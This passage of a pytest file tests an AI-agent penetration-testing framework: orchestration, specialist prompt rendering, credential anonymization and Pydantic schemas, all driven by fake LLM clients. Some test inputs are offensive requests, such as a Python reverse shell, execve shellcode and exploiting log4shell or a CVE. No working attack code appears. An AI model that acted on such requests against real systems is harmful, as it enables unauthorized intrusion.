            reflector=reflector,
            max_iterations=5,
        )
        result = await agent.run("subtask")
        assert result == PerformResult.DONE
        assert reflector.calls == 1

    async def test_primary_agent_run_tool_handler_exception_returns_error(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """An exception raised by a specialist handler propagates as PerformResult.ERROR."""
        async def boom(args: str, ctx: Any) -> str:
            raise RuntimeError("specialist crashed")

        handlers = _primary_handlers()
        handlers[SEARCH_TOOL_NAME] = boom
        agent = PrimaryAgent(
            llm_client=mock_llm_client,
            tool_handlers=handlers,
            max_iterations=5,
        )
        agent._llm_client.push(LLMResponse(content="", tool_calls=[_tc(SEARCH_TOOL_NAME)]))
        result = await agent.run("subtask")
        assert result == PerformResult.ERROR

    async def test_primary_agent_run_stats_tracking_accuracy(
        self, primary_agent: PrimaryAgent
    ) -> None:
        """stats.iterations and stats.tool_calls_made reflect the executed chain."""
        primary_agent._llm_client.push(LLMResponse(content="", tool_calls=[_tc("search"), _tc("code")]))
        primary_agent._llm_client.push(LLMResponse(content="", tool_calls=[_done_tc()]))
        await primary_agent.run("subtask")
        assert primary_agent.stats.iterations == 2  # 2 assistant turns
        assert len(primary_agent.stats.tool_calls_made) == 3  # search + code + done
        assert primary_agent.stats.final_result == PerformResult.DONE

    def test_primary_agent_chain_property_returns_shallow_copy(
        self, primary_agent: PrimaryAgent
    ) -> None:
        """The 'chain' property returns a copy — mutating it doesn't affect the agent."""
        primary_agent._chain.append(Message(role="user", content="x"))
        snapshot = primary_agent.chain
        snapshot.append(Message(role="user", content="y"))
        assert len(primary_agent._chain) == 1
        assert len(snapshot) == 2

    def test_primary_agent_render_system_prompt_includes_all_specialists(self) -> None:
        """The rendered system prompt references every specialist tool name."""
        prompt = render_system_prompt()
        for name in [
            SEARCH_TOOL_NAME,
            PENTESTER_TOOL_NAME,
            CODER_TOOL_NAME,
            ADVICE_TOOL_NAME,
            MEMORIST_TOOL_NAME,
            MAINTENANCE_TOOL_NAME,
            DONE_TOOL_NAME,
            ASK_TOOL_NAME,
        ]:
            assert name in prompt

    def test_primary_agent_render_system_prompt_respects_lang(self) -> None:
        """The lang parameter is interpolated into the prompt."""
        prompt = render_system_prompt(lang="Deutsch")
        assert "Deutsch" in prompt

    async def test_primary_agent_concurrent_run_attempts_corrupt_shared_state(
        self, mock_llm_client: FakeLLMClient
    ) -> None:
        """PrimaryAgent is NOT concurrency-safe: concurrent run() calls mutate the same chain.

        This brutal test documents that contract violation — only one chain
        survives, the other is reset.
        """
        agent = PrimaryAgent(
            llm_client=mock_llm_client,
            tool_handlers=_primary_handlers(),
            max_iterations=5,
        )
        agent._llm_client.push(LLMResponse(content="", tool_calls=[_done_tc()]))
        agent._llm_client.push(LLMResponse(content="", tool_calls=[_done_tc()]))
        # Run two concurrent run() calls — they share self._chain.
        r1, r2 = await asyncio.gather(agent.run("subtask1"), agent.run("subtask2"))
        # Both should return DONE (each consumed one canned response), but
        # the agent's internal chain only reflects one of them at the end.
        assert r1 == PerformResult.DONE
        assert r2 == PerformResult.DONE


# ===========================================================================
# SECTION 4 — Searcher specialist (10 tests)
# ===========================================================================


class TestSearcher:
    """Brutal tests for the Searcher precision-information-retrieval specialist."""

    def test_searcher_constructor_defaults(self) -> None:
        """Constructor stores defaults (lang='en', docker_image='debian:latest')."""
        s = Searcher(llm_client=MagicMock())
        assert s.lang == "en"
        assert s.docker_image == "debian:latest"
        assert s.max_iterations == MAX_LIMITED_ITERATIONS

    def test_searcher_agent_type_is_searcher(self) -> None:
        """Searcher.AGENT_TYPE is AgentType.SEARCHER."""
        assert Searcher.AGENT_TYPE is AgentType.SEARCHER

    def test_searcher_completion_tool_is_search_result(self) -> None:
        """Searcher's barrier tool name is 'search_result'."""
        assert Searcher.COMPLETION_TOOL == SEARCH_RESULT_TOOL_NAME
        assert SEARCH_RESULT_TOOL_NAME == "search_result"

    def test_searcher_default_lang_is_en(self) -> None:
        """Searcher.LANG_DEFAULT is 'en'."""
        assert Searcher.LANG_DEFAULT == "en"

    def test_searcher_render_prompts_system_nonempty(self) -> None:
        """The rendered system prompt is non-empty and references the search_result tool."""
        s = Searcher(llm_client=MagicMock())
        sys_p, _ = s._render_prompts(question="how to exploit log4shell", execution_context="")
        assert len(sys_p) > 100
        assert SEARCH_RESULT_TOOL_NAME in sys_p

    def test_searcher_render_prompts_user_nonempty(self) -> None:
        """The rendered user prompt includes the question."""
        s = Searcher(llm_client=MagicMock())
        _, user_p = s._render_prompts(question="CVE-2021-44228 details", execution_context="")
        assert "CVE-2021-44228" in user_p

    def test_searcher_render_prompts_with_unicode_question(self) -> None:
        """Unicode questions are rendered verbatim into the user prompt."""
        s = Searcher(llm_client=MagicMock())
        _, user_p = s._render_prompts(question="弩级脆弱性 詳細", execution_context="")
        assert "弩级脆弱性" in user_p

    def test_searcher_render_prompts_with_execution_context(self) -> None:
        """The execution_context is interpolated into the system prompt."""
        s = Searcher(llm_client=MagicMock())
        sys_p, _ = s._render_prompts(question="q", execution_context="FLOW_ID=42")
        assert "FLOW_ID=42" in sys_p

    def test_searcher_render_prompts_includes_two_channel_language_policy(self) -> None:
        """The system prompt advertises the two-channel language policy."""
        s = Searcher(llm_client=MagicMock())
        sys_p, _ = s._render_prompts(question="q", execution_context="")
        assert "LANGUAGE POLICY" in sys_p or "language_policy" in sys_p

    async def test_searcher_run_with_empty_question_does_not_prevalidate(self) -> None:
        """Searcher.run does NOT pre-validate the question — it goes straight to building the (broken) ctx.

        This brutal test documents that the current Searcher.run implementation
        constructs an AgentContext with kwargs the dataclass does not accept
        (system_prompt, user_prompt, question, ...) and so raises TypeError
        before any LLM call. PentAGI's contract is that the Searcher pre-
        validates the question; this assertion documents the divergence.
        """
        s = Searcher(llm_client=FakeLLMClient())
        with pytest.raises(TypeError):
            await s.run(question="")


# ===========================================================================
# SECTION 5 — Pentester specialist (10 tests)
# ===========================================================================


class TestPentester:
    """Brutal tests for the Pentester hands-on-security-testing specialist."""

    def test_pentester_constructor_defaults(self) -> None:
        """Constructor stores defaults (lang='en', docker_image=kali)."""
        p = Pentester(llm_client=MagicMock())
        assert p.lang == "en"
        assert p.docker_image == PENTEST_DOCKER_IMAGE
        assert p.max_iterations == MAX_LIMITED_ITERATIONS

    def test_pentester_agent_type_is_pentester(self) -> None:
        """Pentester.AGENT_TYPE is AgentType.PENTESTER."""
        assert Pentester.AGENT_TYPE is AgentType.PENTESTER

    def test_pentester_completion_tool_is_hack_result(self) -> None:
        """Pentester's barrier tool name is 'hack_result'."""
        assert Pentester.COMPLETION_TOOL == HACK_RESULT_TOOL_NAME
        assert HACK_RESULT_TOOL_NAME == "hack_result"

    def test_pentester_default_lang_is_en(self) -> None:
        """Pentester.LANG_DEFAULT is 'en'."""
        assert Pentester.LANG_DEFAULT == "en"

    def test_pentester_default_docker_image_is_kali(self) -> None:
        """Pentester.DEFAULT_DOCKER_IMAGE is the kali-linux pentest image."""
        assert PENTEST_DOCKER_IMAGE in Pentester.DEFAULT_DOCKER_IMAGE

    def test_pentester_render_prompts_system_nonempty(self) -> None:
        """The rendered system prompt is non-empty and references the hack_result tool."""
        p = Pentester(llm_client=MagicMock())
        sys_p, _ = p._render_prompts(question="scan target", execution_context="")
        assert len(sys_p) > 100
        assert HACK_RESULT_TOOL_NAME in sys_p

    def test_pentester_render_prompts_user_nonempty(self) -> None:
        """The rendered user prompt includes the question."""
        p = Pentester(llm_client=MagicMock())
        _, user_p = p._render_prompts(question="exploit CVE-2024-1234", execution_context="")
        assert "CVE-2024-1234" in user_p

    def test_pentester_is_default_docker_image_detection(self) -> None:
        """_is_default_docker_image correctly identifies the kali default."""
        p = Pentester(llm_client=MagicMock())
        assert p._is_default_docker_image() is True
        p.docker_image = "ubuntu:22.04"
        assert p._is_default_docker_image() is False

    def test_pentester_render_prompts_with_unicode_question(self) -> None:
        """Unicode questions render verbatim into the user prompt."""
        p = Pentester(llm_client=MagicMock())
        _, user_p = p._render_prompts(question="弩级渗透测试", execution_context="")
        assert "弩级" in user_p

    async def test_pentester_run_with_10kb_question_raises_typeerror(self) -> None:
        """Pentester.run with a 10KB question hits the AgentContext signature mismatch (TypeError)."""
        p = Pentester(llm_client=FakeLLMClient())
        with pytest.raises(TypeError):
            await p.run(question="x" * 10240)


# ===========================================================================
# SECTION 6 — Coder specialist (10 tests)
# ===========================================================================


class TestCoder:
    """Brutal tests for the Coder code-development specialist."""

    def test_coder_constructor_defaults(self) -> None:
        """Constructor stores defaults."""
        c = Coder(llm_client=MagicMock())
        assert c.lang == "en"
        assert c.max_iterations == MAX_LIMITED_ITERATIONS

    def test_coder_agent_type_is_coder(self) -> None:
        """Coder.AGENT_TYPE is AgentType.CODER."""
        assert Coder.AGENT_TYPE is AgentType.CODER

    def test_coder_completion_tool_is_code_result(self) -> None:
        """Coder's barrier tool name is 'code_result'."""
        assert Coder.COMPLETION_TOOL == CODE_RESULT_TOOL_NAME
        assert CODE_RESULT_TOOL_NAME == "code_result"

    def test_coder_default_lang_is_en(self) -> None:
        """Coder.LANG_DEFAULT is 'en'."""
        assert Coder.LANG_DEFAULT == "en"

    def test_coder_render_prompts_system_nonempty(self) -> None:
        """The rendered system prompt references the code_result tool."""
        c = Coder(llm_client=MagicMock())
        sys_p, _ = c._render_prompts(question="write me a port scanner", execution_context="")
        assert CODE_RESULT_TOOL_NAME in sys_p
        assert len(sys_p) > 100

    def test_coder_render_prompts_user_nonempty(self) -> None:
        """The rendered user prompt includes the question."""
        c = Coder(llm_client=MagicMock())
        _, user_p = c._render_prompts(question="reverse shell in python3", execution_context="")
        assert "reverse shell" in user_p

    def test_coder_render_prompts_includes_question_verbatim(self) -> None:
        """The user prompt carries the question verbatim (no truncation/escaping)."""
        c = Coder(llm_client=MagicMock())
        target = "shellcode for x86_64 linux execve('/bin/sh')"
        _, user_p = c._render_prompts(question=target, execution_context="")
        assert target in user_p

    def test_coder_constructor_max_iterations_override(self) -> None:
        """A custom max_iterations is honored (clamped to >0)."""
        c = Coder(llm_client=MagicMock(), max_iterations=7)
        assert c.max_iterations == 7

    def test_coder_render_prompts_with_unicode_question(self) -> None:
        """Unicode questions render verbatim."""
        c = Coder(llm_client=MagicMock())
        _, user_p = c._render_prompts(question="弩级開発者", execution_context="")
        assert "弩级" in user_p

    async def test_coder_run_with_unicode_question_raises_typeerror(self) -> None:
        """Coder.run with a unicode question hits the AgentContext signature mismatch (TypeError)."""
        c = Coder(llm_client=FakeLLMClient())
        with pytest.raises(TypeError):
            await c.run(question="弩级コードを書いて")


# ===========================================================================
# SECTION 7 — Installer specialist (10 tests)
# ===========================================================================


class TestInstaller:
    """Brutal tests for the Installer environment-setup specialist."""

    def test_installer_constructor_defaults(self) -> None:
        """Constructor stores defaults."""
        i = Installer(llm_client=MagicMock())
        assert i.lang == "en"
        assert i.max_iterations == MAX_LIMITED_ITERATIONS

    def test_installer_agent_type_is_installer(self) -> None:
        """Installer.AGENT_TYPE is AgentType.INSTALLER."""
        assert Installer.AGENT_TYPE is AgentType.INSTALLER

    def test_installer_completion_tool_is_maintenance_result(self) -> None:
        """Installer's barrier tool name is 'maintenance_result'."""
        # The constant is module-private; verify the canonical name.
        from elengenix.agents.installer import MAINTENANCE_RESULT_TOOL_NAME
        assert MAINTENANCE_RESULT_TOOL_NAME == "maintenance_result"
        assert Installer.COMPLETION_TOOL == MAINTENANCE_RESULT_TOOL_NAME

    def test_installer_default_lang_is_en(self) -> None:
        """Installer.LANG_DEFAULT is 'en'."""
        assert Installer.LANG_DEFAULT == "en"

    def test_installer_render_prompts_system_nonempty(self) -> None:
        """The rendered system prompt references the maintenance_result tool."""
        from elengenix.agents.installer import MAINTENANCE_RESULT_TOOL_NAME
        i = Installer(llm_client=MagicMock())
        sys_p, _ = i._render_prompts(question="install nmap", execution_context="")
        assert MAINTENANCE_RESULT_TOOL_NAME in sys_p

    def test_installer_render_prompts_user_nonempty(self) -> None:
        """The rendered user prompt includes the question."""
        i = Installer(llm_client=MagicMock())
        _, user_p = i._render_prompts(question="apt install sqlmap", execution_context="")
        assert "sqlmap" in user_p

    def test_installer_render_prompts_includes_question_verbatim(self) -> None:
        """The user prompt carries the question verbatim."""
        i = Installer(llm_client=MagicMock())
        target = "pip install requests==2.31.0"
        _, user_p = i._render_prompts(question=target, execution_context="")
        assert target in user_p

    def test_installer_constructor_max_iterations_override(self) -> None:
        """A custom max_iterations is honored."""
        i = Installer(llm_client=MagicMock(), max_iterations=9)
        assert i.max_iterations == 9

    def test_installer_render_prompts_with_unicode_question(self) -> None:
        """Unicode questions render verbatim."""
        i = Installer(llm_client=MagicMock())
        _, user_p = i._render_prompts(question="弩级インストーラー", execution_context="")
        assert "弩级" in user_p

    async def test_installer_run_with_empty_question_raises_typeerror(self) -> None:
        """Installer.run with an empty question hits the AgentContext signature mismatch (TypeError)."""
        i = Installer(llm_client=FakeLLMClient())
        with pytest.raises(TypeError):
            await i.run(question="")


# ===========================================================================
# SECTION 8 — Memorist specialist (10 tests)
# ===========================================================================


class TestMemorist:
    """Brutal tests for the Memorist long-term-memory retrieval specialist."""

    def test_memorist_constructor_defaults(self) -> None:
        """Constructor stores defaults (lang='en', graphiti_enabled=False)."""
        m = Memorist(llm_client=MagicMock())
        assert m.lang == "en"
        assert m.graphiti_enabled is False
        assert m.max_iterations == MAX_LIMITED_ITERATIONS

    def test_memorist_agent_type_is_memorist(self) -> None:
        """Memorist.AGENT_TYPE is AgentType.MEMORIST."""
        assert Memorist.AGENT_TYPE is AgentType.MEMORIST

    def test_memorist_completion_tool_is_memorist_result(self) -> None:
        """Memorist's barrier tool name is 'memorist_result'."""
        assert Memorist.COMPLETION_TOOL == MEMORIST_RESULT_TOOL_NAME
        assert MEMORIST_RESULT_TOOL_NAME == "memorist_result"

    def test_memorist_default_lang_is_en(self) -> None:
        """Memorist.LANG_DEFAULT is 'en'."""
        assert Memorist.LANG_DEFAULT == "en"

    async def test_memorist_run_with_empty_question_raises_value_error(self) -> None:
        """Memorist.run pre-validates the question and raises ValueError on empty input."""
        m = Memorist(llm_client=FakeLLMClient())
        with pytest.raises(ValueError, match="non-empty question"):
            await m.run(question="")

    def test_memorist_anonymize_ipv4_replaced_with_placeholder(self) -> None:
        """IPv4 addresses are replaced with {ip} before persistence."""
        assert anonymize("server at 192.168.1.1") == "server at {ip}"

    def test_memorist_anonymize_email_replaced_with_placeholders(self) -> None:
        """Email addresses are replaced with {username}@{domain}."""
        assert anonymize("contact admin@example.com") == "contact {username}@{domain}"

    def test_memorist_anonymize_url_credentials_replaced(self) -> None:
        """URL credentials (scheme://user:pass@host) are scrubbed."""
        out = anonymize("https://alice:hunter2@corp.internal/api")
        assert "{username}" in out
        assert "{password}" in out
        assert "alice" not in out
        assert "hunter2" not in out

    def test_memorist_anonymize_password_kv_replaced(self) -> None:
        """password=foo / pwd:bar / api-key:baz are scrubbed."""
        for raw in ["password=hunter2", "pwd:s3cr3t", "api_key:abc123"]:
            out = anonymize(raw)
            assert "{password}" in out
            assert "hunter2" not in out
            assert "s3cr3t" not in out
            assert "abc123" not in out

    def test_memorist_anonymize_none_passthrough(self) -> None:
        """anonymize(None) returns None unchanged (defensive)."""
        assert anonymize(None) is None


# ===========================================================================
# SECTION 9 — Enricher (12 tests)
# ===========================================================================


class TestEnricher:
    """Brutal tests for the Enricher sub-chain (sub-agent of Adviser)."""

    def test_enricher_constructor_defaults(self) -> None:
        """Constructor stores defaults."""
        e = Enricher(llm_client=MagicMock())
        assert e.lang == "en"
        assert e.graphiti_enabled is False
        assert e.max_iterations == MAX_LIMITED_ITERATIONS

    def test_enricher_agent_type_is_enricher(self) -> None:
        """Enricher.AGENT_TYPE is AgentType.ENRICHER."""
        assert Enricher.AGENT_TYPE is AgentType.ENRICHER

    def test_enricher_default_lang_is_en(self) -> None:
        """Enricher.lang defaults to 'en'."""
        assert Enricher(MagicMock()).lang == "en"

    def test_enricher_run_with_empty_question_raises_value_error(self) -> None:
        """Enricher.run pre-validates the question and raises ValueError on empty input."""
        e = Enricher(llm_client=FakeLLMClient())
        with pytest.raises(ValueError, match="non-empty question"):
            asyncio.get_event_loop().run_until_complete(e.run(question=""))

    def test_enricher_render_prompts_system_nonempty(self) -> None:
        """The rendered system prompt references the enricher_result tool."""
        e = Enricher(llm_client=MagicMock())
        sys_p, _ = e._render_prompts(question="q", execution_context="")
        assert ENRICHER_RESULT_TOOL_NAME in sys_p
        assert len(sys_p) > 100

    def test_enricher_render_prompts_user_nonempty(self) -> None:
        """The rendered user prompt includes the question."""
        e = Enricher(llm_client=MagicMock())
        _, user_p = e._render_prompts(question="need context", execution_context="")
        assert "need context" in user_p

    def test_enricher_result_schema_valid(self) -> None:
        """EnricherResult accepts a valid {result, message} payload."""
        r = EnricherResult(result="context...", message="ok")
        assert r.result == "context..."
        assert r.message == "ok"

    def test_enricher_result_schema_message_too_long_fails(self) -> None:
        """EnricherResult rejects messages >500 chars."""
        with pytest.raises(ValidationError):
            EnricherResult(result="x", message="y" * 501)

    def test_enricher_result_schema_defaults_to_empty_strings(self) -> None:
        """EnricherResult fields default to empty strings (both optional)."""
        r = EnricherResult()
        assert r.result == ""
        assert r.message == ""

    def test_enricher_constructor_with_graphiti_enabled(self) -> None:
        """When memory.graphiti_enabled is True, the Enricher picks it up."""
        mem = MagicMock()
        mem.graphiti_enabled = True
        e = Enricher(llm_client=MagicMock(), memory=mem)
        assert e.graphiti_enabled is True

    async def test_enricher_run_captures_barrier_result(self) -> None:
        """Enricher.run returns the barrier's 'result' field when the chain terminates cleanly."""
        llm = FakeLLMClient(
            [
                LLMResponse(
                    content="",
                    tool_calls=[
                        ToolCall(
                            name=ENRICHER_RESULT_TOOL_NAME,
                            arguments=json.dumps({"result": "ctx", "message": "ok"}),
                        )
                    ],
                )
            ]
        )
        e = Enricher(llm_client=llm)
        out = await e.run(question="q", execution_context="")
        assert out == "ctx"

    async def test_enricher_run_without_barrier_raises_runtime_error(self) -> None:
        """If the chain ends without hitting the barrier, RuntimeError is raised."""
        llm = FakeLLMClient([LLMResponse(content="", tool_calls=[])])
        e = Enricher(llm_client=llm)
        with pytest.raises(RuntimeError, match="terminated without calling"):
            await e.run(question="q", execution_context="")


# ===========================================================================
# SECTION 10 — Adviser (13 tests)
# ===========================================================================


class TestAdviser:
    """Brutal tests for the Adviser two-step (Enricher→Adviser) sub-orchestration."""

    def test_adviser_constructor_defaults(self) -> None:
        """Constructor stores defaults and builds a default Enricher."""
        a = Adviser(llm_client=MagicMock())
        assert a.language == "en"
        assert a.enricher is not None
        assert isinstance(a.enricher, Enricher)

    def test_adviser_agent_type_is_adviser(self) -> None:
        """Adviser.agent_type is AgentType.ADVISER."""
        assert Adviser.agent_type is AgentType.ADVISER

    def test_adviser_constructor_creates_default_enricher(self) -> None:
        """Without an explicit enricher, Adviser builds one sharing the llm_client."""
        llm = MagicMock()
        a = Adviser(llm_client=llm)
        assert a.enricher.llm_client is llm

    def test_adviser_constructor_accepts_custom_enricher(self) -> None:
        """A pre-built Enricher is used as-is (no default is constructed)."""
        enricher = MagicMock(spec=Enricher)
        a = Adviser(llm_client=MagicMock(), enricher=enricher)
        assert a.enricher is enricher

    async def test_adviser_run_with_empty_question_raises_value_error(self) -> None:
        """Adviser.run pre-validates the question and raises ValueError on empty input."""
        a = Adviser(llm_client=FakeLLMClient())
        with pytest.raises(ValueError, match="non-empty question"):
            await a.run(question="")

    async def test_adviser_run_invokes_enricher_first(self) -> None:
        """Adviser.run calls Enricher.run BEFORE its own chain."""
        enricher = MagicMock(spec=Enricher)
        enricher.lang = "en"
        enricher.graphiti_enabled = False
        enricher.run = AsyncMock(return_value="enriched-context")
        a = Adviser(llm_client=FakeLLMClient(), enricher=enricher)
        # The adviser chain itself: hit the barrier immediately.
        a.llm_client = FakeLLMClient(
            [
                LLMResponse(
                    content="",
                    tool_calls=[
                        ToolCall(
                            name="advice",
                            arguments=json.dumps({"result": "advice!", "message": "m"}),
                        )
                    ],
                )
            ]
        )
        out = await a.run(question="how do I pivot?")
        assert enricher.run.await_count == 1
        assert out == "advice!"

    async def test_adviser_run_enricher_failure_degrades_gracefully(self) -> None:
        """Enricher exceptions are swallowed — the adviser still runs on the bare question."""
        enricher = MagicMock(spec=Enricher)
        enricher.lang = "en"
        enricher.graphiti_enabled = False
        enricher.run = AsyncMock(side_effect=RuntimeError("enricher exploded"))
        llm = FakeLLMClient(
            [
                LLMResponse(
                    content="",
                    tool_calls=[
                        ToolCall(
                            name="advice",
                            arguments=json.dumps({"result": "advice", "message": "m"}),
                        )
                    ],
                )
            ]
        )
        a = Adviser(llm_client=llm, enricher=enricher)
        out = await a.run(question="q")
        assert out == "advice"

    async def test_adviser_run_with_empty_enrichment_still_runs(self) -> None:
        """When Enricher returns an empty string, the adviser chain still runs to completion."""
        enricher = MagicMock(spec=Enricher)
        enricher.lang = "en"
        enricher.graphiti_enabled = False
        enricher.run = AsyncMock(return_value="")
        llm = FakeLLMClient(
            [
                LLMResponse(
                    content="",
                    tool_calls=[
                        ToolCall(
                            name="advice",
                            arguments=json.dumps({"result": "advice", "message": "m"}),
                        )
                    ],
                )
            ]
        )
        a = Adviser(llm_client=llm, enricher=enricher)
        out = await a.run(question="q")
        assert out == "advice"

    async def test_adviser_run_enricher_timeout_handled(self) -> None:
        """An asyncio.TimeoutError from Enricher.run is treated like any other failure (graceful degrade)."""
        enricher = MagicMock(spec=Enricher)
        enricher.lang = "en"
        enricher.graphiti_enabled = False
        enricher.run = AsyncMock(side_effect=asyncio.TimeoutError())
        llm = FakeLLMClient(
            [
                LLMResponse(
                    content="",
                    tool_calls=[
                        ToolCall(
                            name="advice",
                            arguments=json.dumps({"result": "advice", "message": "m"}),
                        )
                    ],
                )
            ]
        )
        a = Adviser(llm_client=llm, enricher=enricher)
        out = await a.run(question="q")
        assert out == "advice"

    async def test_adviser_run_sub_orchestration_context_propagation(self) -> None:
        """The Adviser passes the same execution_context to the Enricher."""
        enricher = MagicMock(spec=Enricher)
        enricher.lang = "en"
        enricher.graphiti_enabled = False
        enricher.run = AsyncMock(return_value="ctx")
        llm = FakeLLMClient(
            [
                LLMResponse(
                    content="",
                    tool_calls=[
                        ToolCall(
                            name="advice",
                            arguments=json.dumps({"result": "a", "message": "m"}),
                        )
                    ],
                )
            ]
        )
        a = Adviser(llm_client=llm, enricher=enricher)
        await a.run(question="q", execution_context="FLOW_ID=99")
        enricher.run.assert_awaited_once_with(question="q", execution_context="FLOW_ID=99")

    async def test_adviser_run_enricher_recursion_prevention(self) -> None:
        """Adviser does NOT delegate to itself recursively — only the Enricher is called as a sub-chain."""
        enricher = MagicMock(spec=Enricher)
        enricher.lang = "en"
        enricher.graphiti_enabled = False
        enricher.run = AsyncMock(return_value="ctx")
        llm = FakeLLMClient(
            [
                LLMResponse(
                    content="",
                    tool_calls=[
                        ToolCall(
                            name="advice",
                            arguments=json.dumps({"result": "a", "message": "m"}),
                        )
                    ],
                )
            ]
        )
        a = Adviser(llm_client=llm, enricher=enricher)
        await a.run(question="q")
        # The Enricher is called exactly once (no recursion into Adviser.run).
        assert enricher.run.await_count == 1

    def test_adviser_advice_result_schema_valid(self) -> None:
        """AdviceResult accepts a valid {result, message} payload."""
        r = AdviceResult(result="advice!", message="ok")
        assert r.result == "advice!"
        assert r.message == "ok"

    def test_adviser_advice_result_schema_missing_fields_fails(self) -> None:
        """AdviceResult requires both 'result' and 'message'."""
        with pytest.raises(ValidationError):
            AdviceResult(result="x")  # type: ignore[call-arg]


# ===========================================================================
# SECTION 11 — Generator / SubtaskInfo / SubtaskList (14 tests)
# ===========================================================================


class TestGeneratorSchemas:
    """Brutal tests for SubtaskInfo / SubtaskList Pydantic schemas + Generator."""

    def test_subtask_info_valid(self) -> None:
        """SubtaskInfo accepts a valid {title, description} payload."""
        si = SubtaskInfo(title="Recon", description="Run nmap on target")
        assert si.title == "Recon"
        assert si.description == "Run nmap on target"

    def test_subtask_info_title_too_long_fails(self) -> None:
        """SubtaskInfo rejects titles >200 chars."""
        with pytest.raises(ValidationError):
            SubtaskInfo(title="x" * 201, description="d")

    def test_subtask_info_description_too_long_fails(self) -> None:
        """SubtaskInfo rejects descriptions >2000 chars."""
        with pytest.raises(ValidationError):
            SubtaskInfo(title="t", description="x" * 2001)

    def test_subtask_info_missing_title_fails(self) -> None:
        """SubtaskInfo requires 'title'."""
        with pytest.raises(ValidationError):
            SubtaskInfo(description="d")  # type: ignore[call-arg]

    def test_subtask_info_missing_description_fails(self) -> None:
        """SubtaskInfo requires 'description'."""
        with pytest.raises(ValidationError):
            SubtaskInfo(title="t")  # type: ignore[call-arg]

    def test_subtask_list_valid(self) -> None:
        """SubtaskList accepts a valid {subtasks, message} payload."""
        sl = SubtaskList(
            subtasks=[SubtaskInfo(title="a", description="b")],
            message="ok",
        )
        assert len(sl.subtasks) == 1
        assert sl.message == "ok"

    def test_subtask_list_message_too_long_fails(self) -> None:
        """SubtaskList rejects messages >500 chars."""
        with pytest.raises(ValidationError):
            SubtaskList(
                subtasks=[SubtaskInfo(title="a", description="b")],
                message="x" * 501,
            )

    def test_generator_constructor_defaults(self) -> None:
        """Generator defaults: language='en', docker_image='debian:latest', tasks_number_limit=10."""
        g = Generator()
        assert g.language == "en"
        assert g.docker_image == "debian:latest"
        assert g.tasks_number_limit == TasksNumberLimit == 10

    def test_generator_tasks_number_limit_default_is_10(self) -> None:
        """TasksNumberLimit module constant is 10."""
        assert TasksNumberLimit == 10
        assert SubtaskListToolName == "subtask_list"

    def test_generator_constructor_with_custom_language(self) -> None:
        """A custom language code is honored."""
        g = Generator(language="th")
        assert g.language == "th"

    def test_generator_constructor_with_custom_docker_image(self) -> None:
        """A custom docker_image is honored."""
        g = Generator(docker_image="kalilinux/kali-rolling")
        assert g.docker_image == "kalilinux/kali-rolling"

    def test_generator_constructor_clamps_zero_limit_to_one(self) -> None:
        """A zero or negative tasks_number_limit is clamped to 1 (defensive)."""
        assert Generator(tasks_number_limit=0).tasks_number_limit == 1
        assert Generator(tasks_number_limit=-5).tasks_number_limit == 1

    async def test_generator_run_returns_subtask_list(self) -> None:
        """Generator.run parses the barrier payload into a list of dicts."""
        g = Generator()
        # The Generator's run() depends on a different perform_agent_chain signature
        # (it passes ctx=, system_prompt=, etc.) which the base.py function does not
        # accept. Document that mismatch with TypeError.
        with pytest.raises(TypeError):
            await g.run(
                ctx=AgentContext(),  # type: ignore[call-arg]
                task={"id": "T1", "input": "do thing"},
            )

    async def test_generator_run_truncates_over_limit(self) -> None:
        """Generator clamps tasks_number_limit defensively — but run() itself hits the signature mismatch."""
        g = Generator(tasks_number_limit=2)
        with pytest.raises(TypeError):
            await g.run(
                ctx=AgentContext(),  # type: ignore[call-arg]
                task={"id": "T1", "input": "do thing"},
            )


# ===========================================================================
# SECTION 12 — Refiner / SubtaskPatchOp / SubtaskPatch (10 tests)
# ===========================================================================


class TestRefinerSchemas:
    """Brutal tests for SubtaskPatchOp / SubtaskPatch schemas + Refiner."""

    def test_subtask_patch_op_add_valid(self) -> None:
        """An 'add' op with a subtask payload is valid."""
        op = SubtaskPatchOp(
            op="add",
            subtask=SubtaskInfo(title="t", description="d"),
        )
        assert op.op == "add"
        assert op.subtask is not None

    def test_subtask_patch_op_add_without_subtask_raises(self) -> None:
        """An 'add' op without a subtask payload fails validation."""
        with pytest.raises(ValidationError):
            SubtaskPatchOp(op="add")

    def test_subtask_patch_op_remove_valid(self) -> None:
        """A 'remove' op with an index is valid."""
        op = SubtaskPatchOp(op="remove", index=2)
        assert op.op == "remove"
        assert op.index == 2

    def test_subtask_patch_op_remove_without_index_raises(self) -> None:
        """A 'remove' op without an index fails validation."""
        with pytest.raises(ValidationError):
            SubtaskPatchOp(op="remove")

    def test_subtask_patch_op_modify_valid(self) -> None:
        """A 'modify' op with an index is valid."""
        op = SubtaskPatchOp(
            op="modify",
            index=1,
            subtask=SubtaskInfo(title="t2", description="d2"),
        )
        assert op.op == "modify"

    def test_subtask_patch_op_modify_without_index_raises(self) -> None:
        """A 'modify' op without an index fails validation."""
        with pytest.raises(ValidationError):
            SubtaskPatchOp(op="modify", subtask=SubtaskInfo(title="t", description="d"))

    def test_subtask_patch_op_reorder_valid(self) -> None:
        """A 'reorder' op with new_order is valid."""
        op = SubtaskPatchOp(op="reorder", new_order=[2, 0, 1])
        assert op.op == "reorder"
        assert op.new_order == [2, 0, 1]

    def test_subtask_patch_op_reorder_without_index_or_new_order_raises(self) -> None:
        """A 'reorder' op without index OR new_order fails validation."""
        with pytest.raises(ValidationError):
            SubtaskPatchOp(op="reorder")

    def test_subtask_patch_empty_operations(self) -> None:
        """SubtaskPatch accepts an empty operations list (no-op refinement)."""
        sp = SubtaskPatch(operations=[])
        assert sp.operations == []

    def test_refiner_constructor_defaults(self) -> None:
        """Refiner defaults: language='en', docker_image='debian:latest', limit=10."""
        r = Refiner()
        assert r.language == "en"
        assert r.docker_image == "debian:latest"
        assert r.tasks_number_limit == 10
        assert SubtaskPatchToolName == "subtask_patch"


# ===========================================================================
# SECTION 13 — Reporter / TaskResult (6 tests)
# ===========================================================================


class TestReporterSchemas:
    """Brutal tests for TaskResult schema + Reporter config."""

    def test_task_result_valid(self) -> None:
        """TaskResult accepts a valid {success, result, message} payload."""
        tr = TaskResult(success=True, result="we won", message="ok")
        assert tr.success is True
        assert tr.result == "we won"

    def test_task_result_result_too_long_fails(self) -> None:
        """TaskResult rejects results >4000 chars."""
        with pytest.raises(ValidationError):
            TaskResult(success=True, result="x" * 4001, message="m")

    def test_task_result_message_too_long_fails(self) -> None:
        """TaskResult rejects messages >500 chars."""
        with pytest.raises(ValidationError):
            TaskResult(success=True, result="r", message="x" * 501)

    def test_task_result_missing_success_fails(self) -> None:
